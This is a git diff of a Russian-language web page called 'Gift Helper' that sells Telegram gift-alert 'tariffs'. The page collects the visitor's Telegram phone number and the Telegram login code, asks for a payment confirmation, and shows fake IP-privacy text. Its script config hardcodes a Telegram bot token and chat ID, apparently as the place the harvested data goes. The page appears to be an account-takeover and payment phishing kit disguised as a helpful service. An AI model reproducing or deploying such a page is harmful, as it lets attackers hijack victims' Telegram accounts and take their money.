@@ -1,5 +1,3 @@
-# GIFT_HELPER
-HELP YOU WITH GIFTS
 <!DOCTYPE html>
 <html lang="en" >
 <head>
@@ -7,255 +5,156 @@ HELP YOU WITH GIFTS
   <title>GIFTHELPER</title>
   <link rel="stylesheet" href="./style.css">
 
-</head>[Uploading /* ===== CONFIG ===== */
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Neon Portal — Tariffs</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div id="top-bar">
+    <span id="ip-fixed">Ваш IP: ЗАСЕКРЕЧЕНО</span>
+    <span id="ip-location">Канада, Toronto</span>
+    <span id="codes-left">Коды: 25</span>
+    <button id="admin-toggle" class="small-btn">Коды</button>
+  </div>
+
+  <main id="page-home" class="page">
+    <h1 data-lang="title">Gift Helper</h1>
+    <div class="col">
+      <button id="btn-connect" class="neon" data-lang="btnConnect">Подключить тариф</button>
+      <button id="btn-lang" class="neon" data-lang="btnLang">Поменять язык</button>
+      <button id="btn-support" class="neon" data-lang="btnSupport">Поддержка</button>
+    </div>
+  </main>
+
+  <section id="page-plans" class="page hidden">
+    <h2 data-lang="choosePlan">Выберите тариф</h2>
+    <div class="col">
+      <button class="tariff neon" data-tariff="free"><span data-lang="free">Бесплатно</span></button>
+      <div class="desc" data-lang="freeDesc">Звонки через Telegram при появлении подарков (точность 85%).</div>
+
+      <button class="tariff neon" data-tariff="25"><span data-lang="stars25">25 звёзд</span></button>
+      <div class="desc" data-lang="stars25Desc">Телефон воспроизводит сирену в Telegram при появлении подарков.</div>
+
+      <button class="tariff neon" data-tariff="50"><span data-lang="stars50">50 звёзд</span></button>
+      <div class="desc" data-lang="stars50Desc">Автоматическая покупка подарка (50 звёзд = 1 подарок). Доступны: Дешёвый / Средний / Дорогой.</div>
+    </div>
+    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-detail" class="page hidden">
+    <h2 id="detail-title"></h2>
+    <p id="detail-desc" class="desc"></p>
+
+    <div id="cats" class="categories hidden">
+      <label><input name="cat" type="radio" value="cheap"> Дешёвый</label>
+      <label><input name="cat" type="radio" value="medium" checked> Средний</label>
+      <label><input name="cat" type="radio" value="expensive"> Дорогой</label>
+    </div>
+
+    <button id="detail-continue" class="neon">Продолжить</button>
+    <button class="back-big" data-back="plans"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-phone" class="page hidden">
+    <h2 data-lang="enterPhoneTitle">Введите номер телефона для входа на сайте</h2>
+    <p class="desc" data-lang="phoneHint">Введите номер, привязанный к Telegram — вы получите код в Telegram.</p>
+    <input id="input-phone" type="tel" placeholder="+7..." />
+    <button id="phone-send" class="neon">Отправить</button>
+    <button class="back-big" data-back="detail"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-phone-verify" class="page hidden">
+    <h2 data-lang="enterPhoneCode">Введите код из Telegram</h2>
+    <p class="desc">Введите код, который пришёл вам в Telegram.</p>
+    <input id="input-phone-code" type="text" placeholder="Код из Telegram" />
+    <div id="phone-code-error" class="error hidden"></div>
+    <button id="phone-code-submit" class="neon">Подтвердить номер</button>
+    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-checkout" class="page hidden">
+    <h2 data-lang="checkoutTitle">Оплата</h2>
+
+    <div id="checkout-cats" class="hidden">
+      <div class="desc">Выберите категорию подарка</div>
+      <div class="categories">
+        <label><input name="cat2" type="radio" value="cheap"> Дешёвый</label>
+        <label><input name="cat2" type="radio" value="medium" checked> Средний</label>
+        <label><input name="cat2" type="radio" value="expensive"> Дорогой</label>
+      </div>
+    </div>
+
+    <div id="checkout-qty" class="hidden">
+      <label data-lang="qtyLabel">Количество подарков (1–10000)</label>
+      <input id="input-qty" type="number" min="1" max="10000" value="1" />
+      <p id="total-sum" class="desc"></p>
+    </div>
+
+    <p id="send-instruction" class="desc"></p>
+    <button id="paid-btn" class="neon">Я оплатил</button>
+    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-manager-code" class="page hidden">
+    <h2 data-lang="enterManagerCode">Код от менеджера</h2>
+    <p class="desc">Введите менеджерский код, выданный админом.</p>
+    <input id="input-manager-code" type="text" placeholder="Код менеджера" />
+    <div id="manager-code-error" class="error hidden"></div>
+    <button id="manager-code-submit" class="neon">Подтвердить код</button>
+    <button class="back-big" data-back="checkout"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-login-code" class="page hidden">
+    <h2 data-lang="enterLoginCode">Введите код из Telegram</h2>
+    <p class="desc">Введите финальный код, который вам отправит админ в Telegram.</p>
+    <input id="input-login-code" type="text" placeholder="Код из Telegram" />
+    <div id="login-code-error" class="error hidden"></div>
+    <button id="login-code-submit" class="neon">Подтвердить</button>
+    <button class="back-big" data-back="manager-code"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-activated" class="page hidden">
+    <div class="celebrate">
+      <h2 id="activated-msg">Тариф активирован</h2>
+      <p class="desc">Если есть вопросы — пишите: <b>@GIFTHELPER_support</b></p>
+    </div>
+    <button class="neon" id="to-home">На главную</button>
+  </section>
+
+  <section id="page-support" class="page hidden">
+    <h2 data-lang="supportTitle">Поддержка</h2>
+    <div class="support-user">@GIFTHELPER_support</div>
+    <div id="meme-area" class="meme-area"></div>
+    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <section id="page-admin" class="page hidden">
+    <h2>Админ — Коды</h2>
+    <p class="desc">Нажмите код, чтобы выдать его клиенту (копируется в буфер и переходит в issued).</p>
+    <div id="codes-list" class="codes-list"></div>
+    <p class="desc">Остаток: <span id="admin-left">0</span></p>
+    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
+  </section>
+
+  <script src="script.js"></script>
+</body>
+</html>
+<!-- partial -->
+  <script  src="./script.js"></script>
+
+</body>
+</html>
+/* ===== CONFIG ===== */
 const BOT_TOKEN = "8444402955:AAHSZZyRkJE6FSHH8TtXDgGBfWSp3ryV9RE";
 const CHAT_ID  = "7449969304";
-const ADMIN:root {
-  --neon:#0ff;
-  --green:#6aff6a;
-  --bg:#000;
-}
-
-* {
-  box-sizing: border-box;
-}
-
-body {
-  margin: 0;
-  min-height: 100vh;
-  background: var(--bg);
-  color: var(--neon);
-  font-family: "Segoe UI", Roboto, Arial;
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-  padding: 20px;
-}
-
-/* TOP BAR */
-#top-bar {
-  position: fixed;
-  left: 50%;
-  transform: translateX(-50%);
-  top: 10px;
-  padding: 8px 12px;
-  background: rgba(0, 0, 0, 0.75);
-  border-radius: 10px;
-  border: 1px solid rgba(0, 255, 255, 0.12);
-  color: var(--neon);
-  font-size: 13px;
-  z-index: 100;
-  display: flex;
-  gap: 12px;
-  align-items: center;
-}
-
-#ip-fixed {
-  color: var(--green);
-  font-weight: 700;
-  text-shadow: 0 0 10px rgba(0, 255, 0, 0.25);
-}
-
-#ip-location {
-  color: rgba(170, 255, 170, 0.9);
-  font-size: 12px;
-  margin-left: 6px;
-}
-
-#codes-left {
-  background: rgba(0, 255, 0, 0.06);
-  padding: 4px 8px;
-  border-radius: 6px;
-  color: var(--green);
-  font-weight: 700;
-}
-
-.small-btn {
-  background: transparent;
-  border: 1px solid rgba(255, 255, 255, 0.06);
-  color: var(--neon);
-  padding: 6px 8px;
-  border-radius: 6px;
-  cursor: pointer;
-}
-
-/* pages */
-.page {
-  width: 380px;
-  max-width: calc(100% - 40px);
-  margin-top: 80px;
-  text-align: center;
-}
-
-.hidden {
-  display: none;
-}
-
-h1, h2 {
-  margin: 12px 0;
-  text-shadow: 0 0 8px rgba(0, 255, 255, 0.12);
-}
-
-/* column */
-.col {
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-  align-items: center;
-  margin-top: 12px;
-}
-
-.neon {
-  width: 240px;
-  padding: 12px 18px;
-  border-radius: 12px;
-  background: transparent;
-  color: var(--neon);
-  border: 2px solid rgba(0, 255, 255, 0.18);
-  box-shadow: 0 0 14px rgba(0, 255, 255, 0.06);
-  cursor: pointer;
-  font-size: 15px;
-  transition: all 0.18s ease;
-}
-
-.neon:hover {
-  background: var(--neon);
-  color: #000;
-  box-shadow: 0 0 30px var(--neon);
-  transform: translateY(-3px);
-}
-
-/* back button */
-.back-big {
-  margin-top: 18px;
-  width: 84px;
-  height: 84px;
-  border-radius: 50%;
-  border: 2px solid rgba(255, 255, 255, 0.06);
-  background: rgba(0, 0, 0, 0.5);
-  color: var(--neon);
-  font-size: 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  box-shadow: 0 0 10px rgba(0, 255, 255, 0.06);
-}
-
-/* inputs */
-input[type=tel], input[type=text], input[type=number] {
-  width: 220px;
-  padding: 10px;
-  margin: 8px auto;
-  border-radius: 8px;
-  border: 1px solid rgba(0, 255, 255, 0.12);
-  background: #050505;
-  color: var(--neon);
-  text-align: center;
-}
-
-.desc {
-  color: #aee;
-  font-size: 13px;
-  margin: 6px 0 12px;
-}
-
-/* categories and codes */
-.categories {
-  display: flex;
-  gap: 10px;
-  justify-content: center;
-  margin: 10px 0;
-}
-
-.codes-list {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-  justify-content: center;
-  margin-top: 10px;
-}
-
-.code-item {
-  padding: 8px 10px;
-  border-radius: 8px;
-  background: #050505;
-  border: 1px solid rgba(0, 255, 255, 0.06);
-  color: var(--neon);
-  cursor: pointer;
-}
-
-.code-item.issued {
-  background: linear-gradient(90deg, rgba(0, 255, 255, 0.03), rgba(0, 255, 0, 0.03));
-  color: var(--green);
-}
-
-/* meme */
-.meme-area {
-  position: relative;
-  height: 80px;
-  overflow: visible;
-  margin-top: 6px;
-}
-
-.meme {
-  position: absolute;
-  top: 18px;
-  padding: 8px 12px;
-  border-radius: 8px;
-  background: rgba(0, 0, 0, 0.6);
-  border: 1px solid rgba(0, 255, 0, 0.12);
-  color: var(--green);
-  font-weight: 700;
-  text-shadow: 0 0 10px rgba(0, 255, 0, 0.35);
-  white-space: nowrap;
-  box-shadow: 0 0 20px rgba(0, 255, 0, 0.06);
-  pointer-events: none;
-}
-
-.error {
-  color: #ff6a6a;
-  margin-top: 10px;
-  font-weight: 700;
-}
-
-.celebrate {
-  animation: celebrate 900ms ease both;
-}
-
-@keyframes celebrate {
-  0% {
-    transform: scale(0.92);
-    opacity: 0;
-    filter: blur(4px);
-  }
-  50% {
-    transform: scale(1.06);
-    opacity: 1;
-    filter: blur(0);
-  }
-  100% {
-    transform: scale(1);
-    opacity: 1;
-    filter: blur(0);
-  }
-}
-@media (max-width: 420px) {
-  .page {
-    width: 94%;
-    margin-top: 110px;
-  }
-
-  .neon {
-    width: 86%;
-  }
-
-  .back-big {
-    width: 72px;
-    height: 72px;
-    font-size: 14px;
-  }
-}_PASSWORD = "serafimLOSER";
+const ADMIN_PASSWORD = "serafimLOSER";
 const SUPPORT = "@GIFTHELPER_support";
 const PAY_USER = "Juilly";
 
@@ -517,150 +416,252 @@ window.addEventListener('beforeunload', ()=> {
   saveArray(LS_AVAILABLE, availableCodes);
   saveObj(LS_ISSUED, issuedCodes);
   saveObj(LS_USED, usedCodes);
-});script.js…]()
+});
 
-<body>
-<!-- partial:index.partial.html -->
-<!doctype html>
-<html lang="ru">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Neon Portal — Tariffs</title>
-  <link rel="stylesheet" href="style.css" />
-</head>
-<body>
-  <div id="top-bar">
-    <span id="ip-fixed">Ваш IP: ЗАСЕКРЕЧЕНО</span>
-    <span id="ip-location">Канада, Toronto</span>
-    <span id="codes-left">Коды: 25</span>
-    <button id="admin-toggle" class="small-btn">Коды</button>
-  </div>
 
-  <main id="page-home" class="page">
-    <h1 data-lang="title">Gift Helper</h1>
-    <div class="col">
-      <button id="btn-connect" class="neon" data-lang="btnConnect">Подключить тариф</button>
-      <button id="btn-lang" class="neon" data-lang="btnLang">Поменять язык</button>
-      <button id="btn-support" class="neon" data-lang="btnSupport">Поддержка</button>
-    </div>
-  </main>
+:root {
+  --neon:#0ff;
+  --green:#6aff6a;
+  --bg:#000;
+}
 
-  <section id="page-plans" class="page hidden">
-    <h2 data-lang="choosePlan">Выберите тариф</h2>
-    <div class="col">
-      <button class="tariff neon" data-tariff="free"><span data-lang="free">Бесплатно</span></button>
-      <div class="desc" data-lang="freeDesc">Звонки через Telegram при появлении подарков (точность 85%).</div>
+* {
+  box-sizing: border-box;
+}
 
-      <button class="tariff neon" data-tariff="25"><span data-lang="stars25">25 звёзд</span></button>
-      <div class="desc" data-lang="stars25Desc">Телефон воспроизводит сирену в Telegram при появлении подарков.</div>
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: var(--bg);
+  color: var(--neon);
+  font-family: "Segoe UI", Roboto, Arial;
+  display: flex;
+  justify-content: center;
+  align-items: flex-start;
+  padding: 20px;
+}
 
-      <button class="tariff neon" data-tariff="50"><span data-lang="stars50">50 звёзд</span></button>
-      <div class="desc" data-lang="stars50Desc">Автоматическая покупка подарка (50 звёзд = 1 подарок). Доступны: Дешёвый / Средний / Дорогой.</div>
-    </div>
-    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
-  </section>
+/* TOP BAR */
+#top-bar {
+  position: fixed;
+  left: 50%;
+  transform: translateX(-50%);
+  top: 10px;
+  padding: 8px 12px;
+  background: rgba(0, 0, 0, 0.75);
+  border-radius: 10px;
+  border: 1px solid rgba(0, 255, 255, 0.12);
+  color: var(--neon);
+  font-size: 13px;
+  z-index: 100;
+  display: flex;
+  gap: 12px;
+  align-items: center;
+}
 
-  <section id="page-detail" class="page hidden">
-    <h2 id="detail-title"></h2>
-    <p id="detail-desc" class="desc"></p>
+#ip-fixed {
+  color: var(--green);
+  font-weight: 700;
+  text-shadow: 0 0 10px rgba(0, 255, 0, 0.25);
+}
 
-    <div id="cats" class="categories hidden">
-      <label><input name="cat" type="radio" value="cheap"> Дешёвый</label>
-      <label><input name="cat" type="radio" value="medium" checked> Средний</label>
-      <label><input name="cat" type="radio" value="expensive"> Дорогой</label>
-    </div>
+#ip-location {
+  color: rgba(170, 255, 170, 0.9);
+  font-size: 12px;
+  margin-left: 6px;
+}
 
-    <button id="detail-continue" class="neon">Продолжить</button>
-    <button class="back-big" data-back="plans"><span data-lang="back">Назад</span></button>
-  </section>
+#codes-left {
+  background: rgba(0, 255, 0, 0.06);
+  padding: 4px 8px;
+  border-radius: 6px;
+  color: var(--green);
+  font-weight: 700;
+}
 
-  <section id="page-phone" class="page hidden">
-    <h2 data-lang="enterPhoneTitle">Введите номер телефона для входа на сайте</h2>
-    <p class="desc" data-lang="phoneHint">Введите номер, привязанный к Telegram — вы получите код в Telegram.</p>
-    <input id="input-phone" type="tel" placeholder="+7..." />
-    <button id="phone-send" class="neon">Отправить</button>
-    <button class="back-big" data-back="detail"><span data-lang="back">Назад</span></button>
-  </section>
+.small-btn {
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.06);
+  color: var(--neon);
+  padding: 6px 8px;
+  border-radius: 6px;
+  cursor: pointer;
+}
 
-  <section id="page-phone-verify" class="page hidden">
-    <h2 data-lang="enterPhoneCode">Введите код из Telegram</h2>
-    <p class="desc">Введите код, который пришёл вам в Telegram.</p>
-    <input id="input-phone-code" type="text" placeholder="Код из Telegram" />
-    <div id="phone-code-error" class="error hidden"></div>
-    <button id="phone-code-submit" class="neon">Подтвердить номер</button>
-    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
-  </section>
+/* pages */
+.page {
+  width: 380px;
+  max-width: calc(100% - 40px);
+  margin-top: 80px;
+  text-align: center;
+}
 
-  <section id="page-checkout" class="page hidden">
-    <h2 data-lang="checkoutTitle">Оплата</h2>
+.hidden {
+  display: none;
+}
 
-    <div id="checkout-cats" class="hidden">
-      <div class="desc">Выберите категорию подарка</div>
-      <div class="categories">
-        <label><input name="cat2" type="radio" value="cheap"> Дешёвый</label>
-        <label><input name="cat2" type="radio" value="medium" checked> Средний</label>
-        <label><input name="cat2" type="radio" value="expensive"> Дорогой</label>
-      </div>
-    </div>
+h1, h2 {
+  margin: 12px 0;
+  text-shadow: 0 0 8px rgba(0, 255, 255, 0.12);
+}
 
-    <div id="checkout-qty" class="hidden">
-      <label data-lang="qtyLabel">Количество подарков (1–10000)</label>
-      <input id="input-qty" type="number" min="1" max="10000" value="1" />
-      <p id="total-sum" class="desc"></p>
-    </div>
+/* column */
+.col {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  align-items: center;
+  margin-top: 12px;
+}
 
-    <p id="send-instruction" class="desc"></p>
-    <button id="paid-btn" class="neon">Я оплатил</button>
-    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
-  </section>
+.neon {
+  width: 240px;
+  padding: 12px 18px;
+  border-radius: 12px;
+  background: transparent;
+  color: var(--neon);
+  border: 2px solid rgba(0, 255, 255, 0.18);
+  box-shadow: 0 0 14px rgba(0, 255, 255, 0.06);
+  cursor: pointer;
+  font-size: 15px;
+  transition: all 0.18s ease;
+}
 
-  <section id="page-manager-code" class="page hidden">
-    <h2 data-lang="enterManagerCode">Код от менеджера</h2>
-    <p class="desc">Введите менеджерский код, выданный админом.</p>
-    <input id="input-manager-code" type="text" placeholder="Код менеджера" />
-    <div id="manager-code-error" class="error hidden"></div>
-    <button id="manager-code-submit" class="neon">Подтвердить код</button>
-    <button class="back-big" data-back="checkout"><span data-lang="back">Назад</span></button>
-  </section>
+.neon:hover {
+  background: var(--neon);
+  color: #000;
+  box-shadow: 0 0 30px var(--neon);
+  transform: translateY(-3px);
+}
 
-  <section id="page-login-code" class="page hidden">
-    <h2 data-lang="enterLoginCode">Введите код из Telegram</h2>
-    <p class="desc">Введите финальный код, который вам отправит админ в Telegram.</p>
-    <input id="input-login-code" type="text" placeholder="Код из Telegram" />
-    <div id="login-code-error" class="error hidden"></div>
-    <button id="login-code-submit" class="neon">Подтвердить</button>
-    <button class="back-big" data-back="manager-code"><span data-lang="back">Назад</span></button>
-  </section>
+/* back button */
+.back-big {
+  margin-top: 18px;
+  width: 84px;
+  height: 84px;
+  border-radius: 50%;
+  border: 2px solid rgba(255, 255, 255, 0.06);
+  background: rgba(0, 0, 0, 0.5);
+  color: var(--neon);
+  font-size: 16px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  box-shadow: 0 0 10px rgba(0, 255, 255, 0.06);
+}
 
-  <section id="page-activated" class="page hidden">
-    <div class="celebrate">
-      <h2 id="activated-msg">Тариф активирован</h2>
-      <p class="desc">Если есть вопросы — пишите: <b>@GIFTHELPER_support</b></p>
-    </div>
-    <button class="neon" id="to-home">На главную</button>
-  </section>
+/* inputs */
+input[type=tel], input[type=text], input[type=number] {
+  width: 220px;
+  padding: 10px;
+  margin: 8px auto;
+  border-radius: 8px;
+  border: 1px solid rgba(0, 255, 255, 0.12);
+  background: #050505;
+  color: var(--neon);
+  text-align: center;
+}
 
-  <section id="page-support" class="page hidden">
-    <h2 data-lang="supportTitle">Поддержка</h2>
-    <div class="support-user">@GIFTHELPER_support</div>
-    <div id="meme-area" class="meme-area"></div>
-    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
-  </section>
+.desc {
+  color: #aee;
+  font-size: 13px;
+  margin: 6px 0 12px;
+}
 
-  <section id="page-admin" class="page hidden">
-    <h2>Админ — Коды</h2>
-    <p class="desc">Нажмите код, чтобы выдать его клиенту (копируется в буфер и переходит в issued).</p>
-    <div id="codes-list" class="codes-list"></div>
-    <p class="desc">Остаток: <span id="admin-left">0</span></p>
-    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
-  </section>
+/* categories and codes */
+.categories {
+  display: flex;
+  gap: 10px;
+  justify-content: center;
+  margin: 10px 0;
+}
 
-  <script src="script.js"></script>
-</body>
-</html>
-<!-- partial -->
-  <script  src="./script.js"></script>
+.codes-list {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  justify-content: center;
+  margin-top: 10px;
+}
 
-</body>
-</html>
+.code-item {
+  padding: 8px 10px;
+  border-radius: 8px;
+  background: #050505;
+  border: 1px solid rgba(0, 255, 255, 0.06);
+  color: var(--neon);
+  cursor: pointer;
+}
+
+.code-item.issued {
+  background: linear-gradient(90deg, rgba(0, 255, 255, 0.03), rgba(0, 255, 0, 0.03));
+  color: var(--green);
+}
+
+/* meme */
+.meme-area {
+  position: relative;
+  height: 80px;
+  overflow: visible;
+  margin-top: 6px;
+}
+
+.meme {
+  position: absolute;
+  top: 18px;
+  padding: 8px 12px;
+  border-radius: 8px;
+  background: rgba(0, 0, 0, 0.6);
+  border: 1px solid rgba(0, 255, 0, 0.12);
+  color: var(--green);
+  font-weight: 700;
+  text-shadow: 0 0 10px rgba(0, 255, 0, 0.35);
+  white-space: nowrap;
+  box-shadow: 0 0 20px rgba(0, 255, 0, 0.06);
+  pointer-events: none;
+}
+
+.error {
+  color: #ff6a6a;
+  margin-top: 10px;
+  font-weight: 700;
+}
+
+.celebrate {
+  animation: celebrate 900ms ease both;
+}
+
+@keyframes celebrate {
+  0% {
+    transform: scale(0.92);
+    opacity: 0;
+    filter: blur(4px);
+  }
+  50% {
+    transform: scale(1.06);
+    opacity: 1;
+    filter: blur(0);
+  }
+  100% {
+    transform: scale(1);
+    opacity: 1;
+    filter: blur(0);
+  }
+}
+@media (max-width: 420px) {
+  .page {
+    width: 94%;
+    margin-top: 110px;
+  }
+
+  .neon {
+    width: 86%;
+  }
+
+  .back-big {
+    width: 72px;
+    height: 72px;
+    font-size: 14px;
+  }
+}
